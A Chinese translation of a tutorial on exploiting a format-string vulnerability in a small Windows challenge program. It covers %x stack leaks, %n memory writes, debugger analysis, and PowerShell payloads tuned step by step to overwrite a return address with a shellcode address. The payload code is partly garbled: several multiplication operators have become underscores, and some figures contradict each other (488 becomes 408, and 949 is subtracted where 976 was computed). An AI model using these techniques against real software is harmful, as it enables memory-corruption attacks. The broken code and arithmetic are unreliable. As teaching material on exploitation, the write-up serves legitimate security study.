原文地址:[Exploiting Format Strings in
Windows](http://https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/ "Exploiting Format Strings in Windows")
我想在Windows下利用格式字符串时做出一个小挑战。表面上,它要求打开一个文件。起初这可能有点混乱。在读取文件时并不会受到攻击,你可以看到我们对该程序设置的第一个参数在程序中回显了。
让我们在调试器内部进行研究。正如你所看到的，如果argc == 2，应用程序将继续执行,并且argv [1]会被传递到突出显示的那个函数中去。
在这个函数中,memset的功能是与和0一起使用来填充内存,strncpy用来复制用户咋缓冲区内的输入。但您是否注意到eax是由printf函数直接调用的，并没有指定任何格式字符串参数。函数printf将直接调用我们的缓冲区。
让我们试试用%X格式字符串来读取堆栈，该字符串以十六进制的格式来显示文本。可以看出printf函数读取堆栈内存时,是从高到低读取的。
我将给出80个字符和一串％x格式字符串,并查看其输出。
你可看到41表示十六进制A,2558表示%X。
我们可以使用％n来显示当前写入字符串的字符数，直到替换%n的偏移值为止。我们要传递的是变量的地址。基本上，这将写入一个内存位置。例如，
> int main() {
>
> int number;
>
> printf("Hello %nWorld", &number);
>
> printf("%d", number);
>
> }
这将显示值6。
那么。让我们尝试在输入中放置％n，看看会发生什么呢?
可以看到,当我们试图写入地址时程序崩溃了。那调试器中发生了什么呢?  
这就是使得程序崩溃的地方,ECX的值被移入EAX指向的地址。
让我们来检查寄存器。EAX包含78257825，它是指“x％x％”，并且ECX包含了f8。
检查一下堆栈,进行分析时,可以看到我们注入堆栈中的字符。这给我们了一个很好的提示:使用shellcode而不是'A'字符。
在函数结尾处,一旦点击RET，EIP将指向堆栈中前一个函数返回的地址。
如果我们检查调用堆栈,则可以看到指向0019f72c的第一个帧指针。
返回地址是0019f730，它指向前一个函数的00401188。不知您是否注意到0019f730地址前面有空字节。但是，如果我们将这个地址以地位优先的格式写在payload末尾，就不会有影响。
接下来是我们的解决方案。在这个方案中,我们可以控制ECX和EAX。我们可以在ECX中写入shellcode的地址，并在EAX寄存器中写入指向返回地址的指针。一旦程序执行“mov
dword ptr
[eax]，ecx”，shellcode的地址将被写入堆栈的返回地址中。当程序到达函数最后并且触发尾部的LEAVE时，EIP将指向我们新写入的地址，该地址指向我们的shellcode。
这个方案听起来不错,让我们尝试着实现这些操作吧。
首先，我们应该将EAX指向我们的返回地址。我的第一个payload就是这样。如前一张图片一样，EAX包含78257825，即“x％x％”。
> $Buffer = 'A' * 80
>
> $fmt = '%x' * 21 + '%n'
>
> $ret = 'B' * 4
>
> $final = $Buffer + $fmt + $ret
>
> Start-Process ./fmt.exe -ArgumentList $final
我们必须不断尝试，直到EAX指向4个B字符。我一直在增加“％x”字符，最终使EAX指向“BBBB”。所以，我尝试的下一个payload就是这个。
> $Buffer = 'A' * 80
>
> $fmt = '%x' * 41 + '%n'
>
> $ret = 'B' * 4
>
> $final = $Buffer + $fmt + $ret
>
> Start-Process ./fmt.exe -ArgumentList $final
让我们试着通过让ECX寄存器指向我们的shellcode地址来控制它(寄存器)。如上图所示，shellcode位于0019f758,我们尝试把这个数字除以4。
    0x0019f758/4 = 425430
我们将这个值赋给格式字符串％x，这将改变ECX的值。同时，我会将"％x"的字符数从41增加到51，以使EAX指向Bs。这个"％x"一次读取2个字符。在达到目的之前我们必须一直尝试。
> $Buffer = 'A' * 80
>
> $fmt = '%x' _51 + '%.425430x'_ 4 +'%n'
>
> $ret = 'B' * 4
>
> $final = $Buffer + $fmt + $ret
>
> Start-Process ./fmt.exe -ArgumentList $final
现在ECX指向0019f940，但我们需要让ECX指向0019f758。
让我们找出其不同,并继续尝试。
    0x0019f940– 0x0019f758 = 488
通过将408添加到最后一个格式字符串中，我们应该能够接近我们的目标了。让我们试试看。
    425430 + 488 = 425918
> $Buffer = 'A' * 80
>
> $fmt = '%x' _51 + '%.425430x'_ 3 + '%.425918x' +'%n'
>
> $ret = 'B' * 4
>
> $final = $Buffer + $fmt + $ret
>
> Start-Process ./fmt.exe -ArgumentList $final
现在ECX已经指向了19fb28,让我们再来看看有什么差异。
    0x19fb28 – 0x19f758 = 976
通过减少最后一个格式字符串的差异，我们应当让ECX指向我们需要的准确地址。
    425918  -  949 = 424942
> $Buffer = 'A' * 80
>
> $fmt = '%x' _51 + '%.425430x'_ 3 + '%.424942x' +'%n'
>
> $ret = 'B' * 4
>
> $final = $Buffer + $fmt + $ret
>
> Start-Process ./fmt.exe -ArgumentList $final